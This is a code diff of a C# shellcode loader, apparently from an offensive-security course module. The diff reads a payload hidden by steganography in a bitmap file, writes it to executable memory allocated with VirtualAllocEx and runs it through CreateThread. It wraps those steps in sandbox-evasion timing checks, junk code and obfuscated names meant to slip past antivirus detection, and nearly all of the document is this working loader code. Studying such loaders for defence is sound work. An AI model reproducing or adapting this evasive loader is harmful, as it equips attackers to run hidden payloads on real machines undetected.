@@ -9,18 +9,15 @@ using System.Threading;
 using System.Threading.Tasks;
 using System.Drawing;
 
-/**
- * TODO:
- *      We need to copy-paste the program from the link below and edit it to work with the payload byte array:
- *      https://www.codeproject.com/Tips/635715/Steganography-Simple-Implementation-in-Csharp
-*/
-
-namespace Module6_ShellcodeRunner
+namespace Module6
 {
     class Program
     {
         [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
         static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
 
         [DllImport("kernel32.dll")]
         static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
@@ -31,182 +28,93 @@ namespace Module6_ShellcodeRunner
         [DllImport("kernel32.dll")]
         static extern void Sleep(uint dwMilliseconds);
 
+        static int times = 4;
+
         [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
         static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
 
         [DllImport("kernel32.dll")]
         static extern IntPtr GetCurrentProcess();
 
-        /*static byte[] ecksore(byte[] pl, byte[] key)
+        public static void Main(string[] args)
         {
-            int j;
-            j = 0;  // Inefficiency on purpose!!
-            for (int i = 0; i < pl.Length; i++)
-            {
-                if (j == key.Length-1)
-                    continue;
-                pl[i] = pl[i] ^ key[j];
-                j++;
-            }
-        }*/
-        public static string ByteArrayToString(byte[] ba)
-        {
-            StringBuilder hex = new StringBuilder(ba.Length * 2);
-            foreach (byte b in ba)
-                hex.AppendFormat("{0:x2}", b);
-            return hex.ToString();
-        }
 
-        public static int reverseBits(int n)
-        {
-            int result = 0;
-
-            for (int i = 0; i < 8; i++)
-            {
-                result = result * 2 + n % 2;
-
-                n /= 2;
-            }
-
-            return result;
-        }
-
-        public static void halp(string[] args)
-        {
+            System.Console.WriteLine("Hello!");
+            short redstone_repeater = 0;
+            plop:
             // Dealing with HBD
-            DateTime t1 = DateTime.Now;
-            Sleep(2000);
-            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
-            if (t2 < 1.5)
-                return;
-
-            // Alloc. space
-            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);  // TODO: obfs. values
-
-            // pl
-            int lenth = 640;
-            byte[] luhmao = new byte[lenth];
-
-            Bitmap bmp = new Bitmap(@"C:\Users\Robert\source\repos\ejb9469\Module6_ShellcodeRunner\Module6_ShellcodeRunner\bliss_enc.bmp", false);
-
-            String data = "";
-            String binstr = "";
-            int n = 0;
-            int cui = 0;
-            int charValue = 0;
-            for (int i = 0; i < bmp.Width; i++)
+            DateTime Gn2dlpm1ns = DateTime.Now;
+            String heho = "asoduofhoquehfqoudhoasdquwdhouhd102e8u912yd97hdwoauhsdohj109278h2197hd";
+            heho += "22 ++";
+            int nw4lbzWOgg = 1;
+            while (true)
             {
-                for (int j = 0; j < bmp.Height; j++)
+                Sleep(100);
+                System.Console.WriteLine("Hello World!");
+                nw4lbzWOgg += 1;
+                if (nw4lbzWOgg == 21)
                 {
-                    Color pixel = bmp.GetPixel(i, j);
-                    for (int b = 0; b < 3; b++)
-                    {
-                        switch (cui % 3)
-                        {
-                            case 0:
-                                {
-                                    charValue = charValue * 2 + pixel.R % 2;
-                                }
-                                break;
-                            case 1:
-                                {
-                                    charValue = charValue * 2 + pixel.G % 2;
-                                }
-                                break;
-                            case 2:
-                                {
-                                    charValue = charValue * 2 + pixel.B % 2;
-                                }
-                                break;
-                        }
-                        cui++;
-                        if (cui % 8 == 0)
-                        {
-                            charValue = reverseBits(charValue);
-                            // if (charValue
-                        }
-                        if ((n + 1) % 8 == 0)
-                        {
-                            data += Convert.ToChar(Convert.ToInt32(binstr, 2));
-                            binstr = "";
-                            if (pixel.ToArgb() % 2 != 0)
-                            {
-                                i = bmp.Width;
-                                break;
-                            }
-                        }
-                        if (pixel.ToArgb() % 2 == 0)
-                            binstr += "0";
-                        else
-                            binstr += "1";
-                        n++;
-                    }
+                    break;
                 }
-
-                /*int n = 0;
-                for (int i = 0; i < bmp.Width; i++)
-                {
-                    for (int j = 0; j < bmp.Height; j++)
-                    {
-
-                        if (n >= lenth)
-                        {
-                            i = bmp.Width;
-                            break;
-                        }
-
-                        Color pixel = bmp.GetPixel(i, j);
-
-                        R = pixel.R - pixel.R % 2;
-                        G = pixel.G - pixel.G % 2;
-                        B = pixel.B - pixel.B % 2;
-                        int[] rgb = { R, G, B };
-
-                        pixels[n] = rgb;
-
-                        n++;
-
-                    }
-                }
-
-                int x = 0;
-                for (int a = 0; a < 3; a++)
-                {
-                    for (int i = a; i < pixels.Length; i += 3)
-                    {
-                        if (x == 8)
-                        {
-                            if ()
-                            data += Convert.ToChar(Convert.ToInt32(binstr, 2));
-                            binstr = "";
-                            x = 0;
-                            continue;
-                        }
-                        if (i % 2 == 0)
-                            binstr += "0";
-                        else
-                            binstr += "1";
-                        x++;
-                    }
-                }*/
-                //data = Convert.ToString(Convert.ToInt32(binstr, 2));
-
-                luhmao = Encoding.ASCII.GetBytes(data);
-                System.Console.WriteLine(ByteArrayToString(luhmao));
-
-                // Dealing with SBD
-                //luhmao = ecksore(luhmao);
-
-                // Virtual alloc
-                // Copy bytes into buffer
-                // Create thread (Ex numa?)
-
-                if (mem != null)  // etc
-                {
-                    // do your thing
-                }
-
+                heho += Convert.ToString(Math.Cos(nw4lbzWOgg));
             }
+            System.Console.WriteLine("Hello!2");
+            if (DateTime.Now.Subtract(Gn2dlpm1ns).TotalSeconds > 0.5)
+            {
+                if (heho.Equals("poop"))
+                {
+                    return;
+                } else if (DateTime.Now.Subtract(Gn2dlpm1ns).TotalSeconds < 1.5)
+                {
+                    return;
+                } else
+                {
+                    heho = "Didn't return. Java.";
+                }
+            }
+
+            redstone_repeater++;
+
+            int ESRgZW9Rqn = StegHelper.lll;
+            byte[] luhmao = new byte[ESRgZW9Rqn];
+            string asdohuag = System.IO.Directory.GetCurrentDirectory();
+            System.Console.WriteLine(asdohuag);
+            Bitmap blissEnc = new Bitmap(asdohuag + "\\bliss_enc.bmp", false);
+            luhmao = StegHelper.extract(blissEnc);
+
+            // Dealing with SBD
+            //luhmao = ecksore(luhmao);
+
+            IntPtr qgtjErNvQl = IntPtr.Zero;
+            if (redstone_repeater >= times)
+            {
+                qgtjErNvQl = VirtualAllocEx(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x40);
+                System.Console.WriteLine("Alloc");
+            }
+            if (qgtjErNvQl != null)  // etc
+            {
+                if (redstone_repeater < times)
+                {
+                    goto plop;
+                }
+                System.Console.WriteLine("Copy");
+                Marshal.Copy(
+                    luhmao, 
+                    0, 
+                    qgtjErNvQl, 
+                    ESRgZW9Rqn
+                );
+                IntPtr threadyToDie = CreateThread(IntPtr.Zero, 0, qgtjErNvQl, IntPtr.Zero, 0, IntPtr.Zero);
+                float x = 5;
+                float xhalf = 0.5f * x;
+                int i = BitConverter.ToInt32(BitConverter.GetBytes(x), 0);
+                i = 0x5f3759df - (i >> 1);
+                System.Console.WriteLine("Waiting (ideally)");
+                WaitForSingleObject(threadyToDie, 0xFFFFFF);
+                x = BitConverter.ToSingle(BitConverter.GetBytes(i), 0);
+                x = x * (1.5f - xhalf * x * x);
+            }
+
         }
     }
 }
